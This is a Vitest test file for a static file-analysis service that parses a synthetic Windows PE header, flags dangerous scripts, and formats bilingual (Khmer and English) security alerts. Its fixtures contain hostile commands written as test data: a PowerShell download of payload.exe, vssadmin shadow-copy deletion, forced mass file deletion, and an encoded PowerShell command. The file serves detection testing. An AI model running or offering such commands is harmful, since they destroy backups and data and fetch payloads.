import fs from 'node:fs/promises';
import path from 'node:path';
import os from 'node:os';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { FileAnalysisService } from '../src/services/fileAnalysis.service.js';
import { analyzePEFile } from '../src/services/peAnalyzer.service.js';
import { analyzeScriptFile } from '../src/services/scriptAnalyzer.service.js';

describe('File Analysis Tests', () => {
  let tempDir: string;
  let service: FileAnalysisService;

  beforeEach(async () => {
    tempDir = await fs.mkdtemp(path.join(os.tmpdir(), 'test-analysis-'));
    service = new FileAnalysisService();
  });

  afterEach(async () => {
    await fs.rm(tempDir, { recursive: true, force: true });
  });

  function createSyntheticPEBuffer(): Buffer {
    const buf = Buffer.alloc(512);
    // DOS Header
    buf[0] = 0x4d; // 'M'
    buf[1] = 0x5a; // 'Z'
    buf.writeUInt32LE(0x40, 0x3c); // e_lfanew = 0x40

    // NT Signature at 0x40
    buf.write('PE\0\0', 0x40, 'ascii');

    // COFF Header at 0x44
    buf.writeUInt16LE(0x8664, 0x44); // Machine: x64
    buf.writeUInt16LE(1, 0x46); // NumberOfSections: 1
    buf.writeUInt16LE(240, 0x54); // SizeOfOptionalHeader
    buf.writeUInt16LE(0x0002, 0x56); // Characteristics: Executable

    // Optional Header at 0x58
    buf.writeUInt16LE(0x20b, 0x58); // Magic: PE32+ (64-bit)
    buf.writeUInt32LE(0x1000, 0x58 + 16); // AddressOfEntryPoint
    buf.writeUInt16LE(2, 0x58 + 68); // Subsystem: Windows GUI

    return buf;
  }

  it('should parse synthetic Windows PE (.exe) statically and identify architecture', async () => {
    const pePath = path.join(tempDir, 'sample.exe');
    await fs.writeFile(pePath, createSyntheticPEBuffer());

    const result = await analyzePEFile(pePath);
    expect(result.isPE).toBe(true);
    expect(result.architecture).toBe('x64');
    expect(result.peType).toBe('PE32+');
    expect(result.subsystem).toBe('Windows GUI');
    expect(result.digitalSignaturePresent).toBe(false);
  });

  it('should analyze .bat and .cmd scripts statically and detect dangerous commands', async () => {
    const batContent = `@echo off\npowershell -ep bypass -c "Invoke-WebRequest -Uri https://example.com/payload.exe -OutFile setup.exe"\nvssadmin delete shadows /all /quiet\ndel /f /q C:\\data\\*`;
    const batPath = path.join(tempDir, 'install.bat');
    await fs.writeFile(batPath, batContent);

    const scriptResult = await analyzeScriptFile(batPath);
    expect(scriptResult.isScript).toBe(true);
    expect(scriptResult.scriptType).toBe('BATCH');
    expect(scriptResult.hasNetworkActivity).toBe(true);
    expect(scriptResult.hasFileDeletion).toBe(true);
    expect(scriptResult.indicators.some(i => i.includes('PowerShell'))).toBe(true);
    expect(scriptResult.indicators.some(i => i.includes('Shadow Copy'))).toBe(true);
  });

  it('should analyze .ps1 scripts and detect base64 encoded command execution', async () => {
    const ps1Content = `powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=`;
    const ps1Path = path.join(tempDir, 'script.ps1');
    await fs.writeFile(ps1Path, ps1Content);

    const result = await analyzeScriptFile(ps1Path);
    expect(result.isScript).toBe(true);
    expect(result.scriptType).toBe('POWERSHELL');
    expect(result.hasObfuscation).toBe(true);
  });

  it('should correctly evaluate risk for safe files (.jpg, .pdf, .txt)', async () => {
    const txtPath = path.join(tempDir, 'notes.txt');
    await fs.writeFile(txtPath, 'Hello, this is a normal text note.');

    const analysis = await service.analyzeFile(txtPath, 'notes.txt', 'text/plain');
    expect(analysis.riskLevel).toBe('LOW');
    expect(analysis.extension).toBe('.txt');
  });

  it('should assess HIGH risk for .exe and .bat and generate impact summaries', async () => {
    const pePath = path.join(tempDir, 'setup.exe');
    await fs.writeFile(pePath, createSyntheticPEBuffer());

    const analysis = await service.analyzeFile(pePath, 'setup.exe');
    expect(analysis.riskLevel).toBe('HIGH');
    expect(analysis.impactSummary.length).toBeGreaterThan(0);
    expect(analysis.impactSummary.some(s => s.toLowerCase().includes('execute'))).toBe(true);

    const kmAlert = service.formatUserAlert(analysis, 'km');
    expect(kmAlert).toContain('ការជូនដំណឹងសុវត្ថិភាពឯកសារ');
    expect(kmAlert).toContain('setup.exe');
    expect(kmAlert).toContain('រង់ចាំការត្រួតពិនិត្យ');
    expect(kmAlert).toContain('ការវិភាគនេះបង្ហាញពីលក្ខណៈបច្ចេកទេស');

    const enAlert = service.formatUserAlert(analysis, 'en');
    expect(enAlert).toContain('FILE SECURITY ALERT');
    expect(enAlert).toContain('setup.exe');
    expect(enAlert).toContain('Waiting for administrator review');
    expect(enAlert).not.toContain('This file is definitely malware');
    expect(enAlert).toContain('This analysis describes potential capabilities');
  });

  it('should assess CRITICAL risk for scripts attempting volume shadow copy deletion', async () => {
    const ransomwareLikeScript = `@echo off\nvssadmin delete shadows /all /quiet\ndel /f /q *`;
    const scriptPath = path.join(tempDir, 'cleanup.bat');
    await fs.writeFile(scriptPath, ransomwareLikeScript);

    const analysis = await service.analyzeFile(scriptPath, 'cleanup.bat');
    expect(analysis.riskLevel).toBe('CRITICAL');
  });
});
